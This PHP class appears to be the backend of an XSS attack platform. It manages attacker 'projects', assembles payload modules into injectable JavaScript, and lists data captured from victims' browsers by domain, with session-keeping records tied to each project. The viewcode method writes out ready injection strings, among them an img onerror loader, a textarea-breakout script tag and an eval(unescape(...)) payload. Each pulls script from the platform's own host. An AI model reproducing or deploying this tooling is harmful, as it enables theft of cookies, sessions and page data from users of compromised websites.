<?php
final class ProjectService
{
    private function requireUser(): User
    {
        $user = current_user();
        if ($user->userId <= 0) {
            throw new AppError('not_logged_in', 401, '未登录或已超时');
        }
        return $user;
    }

    private function ownedProject(int $id): array
    {
        $user = $this->requireUser();
        $project = db()->FirstRow(
            'SELECT * FROM ' . Tb('project') . ' WHERE id=? AND userId=?',
            [$id, $user->userId]
        );
        if (empty($project)) {
            throw new AppError('project_not_found', 404, '项目不存在或没有权限');
        }
        return $project;
    }

    private function decodeValue(mixed $value): mixed
    {
        if (is_string($value)) {
            return Display::decode($value);
        }
        if (is_array($value)) {
            return array_map([$this, 'decodeValue'], $value);
        }
        return $value;
    }

    public function dashboard(): array
    {
        $user = $this->requireUser();
        $db = db();
        $projects = $db->Dataset(
            'SELECT * FROM ' . Tb('project') . ' WHERE userId=? ORDER BY id DESC',
            [$user->userId]
        );
        foreach ($projects as $k => $v) {
            $projects[$k]['contentNum'] = (int) $db->FirstValue(
                'SELECT COUNT(*) FROM ' . Tb('project_content') . ' WHERE projectId=?',
                [(int) $v['id']]
            );
            $projects[$k]['title'] = Display::decode((string) $v['title']);
            $projects[$k]['description'] = Display::decode((string) $v['description']);
        }
        $modules = $db->Dataset(
            'SELECT * FROM ' . Tb('module') . ' WHERE userId=? OR (isOpen=1 AND isAudit=1) ORDER BY id DESC',
            [$user->userId]
        );
        foreach ($modules as $k => $v) {
            $modules[$k]['title'] = Display::decode((string) $v['title']);
            $modules[$k]['description'] = Display::decode((string) $v['description']);
        }
        return ['projects' => $projects, 'modules' => $modules];
    }

    public function create(array $input): array
    {
        $user = $this->requireUser();
        $title = StripStr((string) ($input['title'] ?? ''));
        if ($title === '') {
            throw new AppError('title_required', 400, '项目名称不能为空');
        }
        $description = StripStr((string) ($input['description'] ?? ''));
        $db = db();
        $existed = $db->FirstColumn('SELECT urlKey FROM ' . Tb('project'));
        $urlKey = ShortUrlCode($existed);
        $authCode = bin2hex(random_bytes(16));
        $id = $db->Insert(Tb('project'), [
            'title' => $title,
            'description' => $description,
            'userId' => $user->userId,
            'urlKey' => $urlKey,
            'authCode' => $authCode,
            'addTime' => time(),
        ]);
        return ['id' => $id, 'urlKey' => $urlKey, 'authCode' => $authCode];
    }

    public function get(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $domain = StripStr((string) ($input['domain'] ?? ''));
        $project = $this->ownedProject($id);
        $db = db();

        $sql = 'SELECT id,projectId,serverContent,content,domain,addTime FROM ' . Tb('project_content')
            . ' WHERE projectId=?';
        $params = [$id];
        if ($domain !== '') {
            $sql .= ' AND domain=?';
            $params[] = $domain;
        }
        $sql .= ' ORDER BY id DESC';
        $contents = $db->Dataset($sql, $params);
        $domains = [];
        foreach ($contents as $k => $v) {
            $decoded = json_decode((string) $v['content'], true);
            if (!is_array($decoded)) {
                $decoded = StripStr((string) $v['content']);
            }
            $contents[$k]['content'] = $this->decodeValue($decoded);
            $server = json_decode((string) $v['serverContent'], true);
            if (!is_array($server)) {
                $server = [];
            }
            $contents[$k]['serverContent'] = $this->decodeValue($server);
            $contents[$k]['domain'] = Display::decode((string) $v['domain']);
            if ($v['domain'] !== '' && !in_array($v['domain'], $domains, true)) {
                $domains[] = Display::decode((string) $v['domain']);
            }
        }

        $project['title'] = Display::decode((string) $project['title']);
        $project['description'] = Display::decode((string) $project['description']);
        return [
            'project' => $project,
            'contents' => $contents,
            'domains' => $domains,
            'domain' => $domain,
        ];
    }

    public function setcodeGet(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $project = $this->ownedProject($id);
        $db = db();
        $user = $this->requireUser();

        $modulesCan = $db->Dataset(
            'SELECT * FROM ' . Tb('module') . ' WHERE (isOpen=1 AND isAudit=1) OR userId=?',
            [$user->userId]
        );
        $moduleSetKeys = json_decode((string) $project['moduleSetKeys'], true);
        if (!is_array($moduleSetKeys)) {
            $moduleSetKeys = [];
        }
        $myModules = json_decode((string) $project['modules'], true);
        if (!is_array($myModules)) {
            $myModules = [];
        }
        $myModules = array_map('intval', $myModules);

        foreach ($modulesCan as $k => $v) {
            $keys = json_decode((string) $v['keys'], true);
            if (!is_array($keys)) {
                $keys = [];
            }
            $keys = array_map([$this, 'decodeValue'], $keys);
            $modulesCan[$k]['keys'] = implode(',', $keys);
            $modulesCan[$k]['code'] = Display::decode((string) $v['code']);
            $modulesCan[$k]['title'] = Display::decode((string) $v['title']);
            $modulesCan[$k]['description'] = Display::decode((string) $v['description']);
            if (in_array((int) $v['id'], $myModules, true)) {
                $modulesCan[$k]['choosed'] = 1;
            }
            if (!empty($v['setkeys'])) {
                $setkeysK = json_decode((string) $v['setkeys'], true);
                if (!is_array($setkeysK)) {
                    $setkeysK = [];
                }
                $setkeys = [];
                foreach ($setkeysK as $kv) {
                    $row = ['key' => Display::decode((string) $kv)];
                    $storedKey = 'setkey_' . $v['id'] . '_' . $kv;
                    if (!empty($moduleSetKeys[$storedKey])) {
                        $row['value'] = Display::decode(urldecode((string) $moduleSetKeys[$storedKey]));
                    }
                    $setkeys[] = $row;
                }
                $modulesCan[$k]['setkeys'] = $setkeys;
            }
        }

        $project['title'] = Display::decode((string) $project['title']);
        $project['description'] = Display::decode((string) $project['description']);
        $project['code'] = Display::decode((string) $project['code']);
        return [
            'project' => $project,
            'modulesCan' => $modulesCan,
            'ty' => (string) ($input['ty'] ?? ''),
        ];
    }

    public function setcodeSave(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $project = $this->ownedProject($id);
        $db = db();
        $values = [];

        if (array_key_exists('code', $input)) {
            $values['code'] = StripStr((string) $input['code']);
        } elseif (array_key_exists('code', $project)) {
            // keep existing code when the caller did not send one
        }

        $modules = $input['modules'] ?? null;
        if (is_array($modules) && $modules !== []) {
            $moduleIds = array_values(array_unique(array_map('intval', $modules)));
            $values['modules'] = JsonEncode($moduleIds);
            $moduleSetKeys = [];
            foreach ($moduleIds as $mId) {
                $module = $db->FirstRow(
                    'SELECT * FROM ' . Tb('module') . ' WHERE id=? AND (userId=? OR (isOpen=1 AND isAudit=1))',
                    [$mId, (int) $project['userId']]
                );
                if (empty($module)) {
                    continue;
                }
                if (empty($module['setkeys'])) {
                    continue;
                }
                $setkeys = json_decode((string) $module['setkeys'], true);
                if (!is_array($setkeys)) {
                    continue;
                }
                foreach ($setkeys as $setkey) {
                    $field = 'setkey_' . $mId . '_' . $setkey;
                    if (!empty($input[$field])) {
                        $moduleSetKeys[$field] = urlencode(StripStr((string) $input[$field]));
                    }
                }
            }
            $values['moduleSetKeys'] = JsonEncode($moduleSetKeys);
        }

        if ($values !== []) {
            $db->Update(Tb('project'), $values, 'id=?', [$id]);
        }
        return [];
    }

    public function viewcode(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $project = $this->ownedProject($id);
        $db = db();

        $code = '';
        $moduleSetKeys = json_decode((string) $project['moduleSetKeys'], true);
        if (!is_array($moduleSetKeys)) {
            $moduleSetKeys = [];
        }
        $moduleIds = json_decode((string) $project['modules'], true);
        if (is_array($moduleIds) && $moduleIds !== []) {
            $ids = array_values(array_map('intval', $moduleIds));
            $placeholders = implode(',', array_fill(0, count($ids), '?'));
            $params = $ids;
            $params[] = (int) $project['userId'];
            $modules = $db->Dataset(
                'SELECT * FROM ' . Tb('module') . ' WHERE id IN (' . $placeholders . ')'
                . ' AND (userId=? OR (isOpen=1 AND isAudit=1))',
                $params
            );
            foreach ($modules as $module) {
                $moduleCode = str_replace('{projectId}', (string) $project['urlKey'], (string) $module['code']);
                if (!empty($module['setkeys'])) {
                    $setkeys = json_decode((string) $module['setkeys'], true);
                    if (is_array($setkeys)) {
                        foreach ($setkeys as $setkey) {
                            $moduleCode = str_replace(
                                '{set.' . $setkey . '}',
                                (string) ($moduleSetKeys['setkey_' . $module['id'] . '_' . $setkey] ?? ''),
                                $moduleCode
                            );
                        }
                    }
                }
                $code .= $moduleCode;
            }
        }
        $code .= (string) $project['code'];

        $time = time();
        $codeurl = URL_ROOT . '/' . $project['urlKey'] . '?' . $time;
        $longUrl = URL_ROOT . '/' . $project['urlKey'] . '?' . $time;
        $longUrl2 = URL_ROOT . '/' . $project['urlKey'] . '?';
        $shortShow1 = $longUrl;
        $shortShow3 = StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='你的js地址';>");
        $scriptShow1 = StripStr("</textarea>'\"><script src=" . $longUrl . "></script>");
        $code2 = 'var b=document.createElement("script");b.src="' . $longUrl2 . '"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
        $scriptShow2 = StripStr("</textarea>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/" . rawurlencode($code2) . "/.source));//>");

        return [
            'code' => Display::decode($code),
            'codeurl' => $codeurl,
            'shortShow1' => $shortShow1,
            'shortShow3' => Display::decode($shortShow3),
            'scriptShow1' => Display::decode($scriptShow1),
            'scriptShow2' => Display::decode($scriptShow2),
            'ty' => (string) ($input['ty'] ?? ''),
        ];
    }

    public function delete(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $this->ownedProject($id);
        $db = db();
        $db->Execute('DELETE FROM ' . Tb('keepsession') . ' WHERE projectId=?', [$id]);
        $db->Execute('DELETE FROM ' . Tb('project_content') . ' WHERE projectId=?', [$id]);
        $db->Execute('DELETE FROM ' . Tb('project') . ' WHERE id=?', [$id]);
        return [];
    }

    public function deleteContent(array $input): array
    {
        $id = (int) ($input['id'] ?? 0);
        $user = $this->requireUser();
        $db = db();
        $content = $db->FirstRow(
            'SELECT pc.projectId FROM ' . Tb('project_content') . ' pc INNER JOIN ' . Tb('project')
            . ' p ON p.id=pc.projectId WHERE p.userId=? AND pc.id=?',
            [$user->userId, $id]
        );
        if (empty($content)) {
            return ['deleted' => 0];
        }
        $db->Execute('DELETE FROM ' . Tb('project_content') . ' WHERE id=?', [$id]);
        return ['deleted' => 1];
    }

    public function deleteContents(array $input): array
    {
        $raw = $input['ids'] ?? [];
        if (is_string($raw)) {
            $raw = explode('|', $raw);
        }
        $ids = is_array($raw) ? array_map('intval', $raw) : [];
        $user = $this->requireUser();
        $db = db();
        $deleted = 0;
        foreach ($ids as $id) {
            $content = $db->FirstRow(
                'SELECT pc.projectId FROM ' . Tb('project_content') . ' pc INNER JOIN ' . Tb('project')
                . ' p ON p.id=pc.projectId WHERE p.userId=? AND pc.id=?',
                [$user->userId, $id]
            );
            if (!empty($content)) {
                $db->Execute('DELETE FROM ' . Tb('project_content') . ' WHERE id=?', [$id]);
                $deleted++;
            }
        }
        return ['deleted' => $deleted];
    }
}
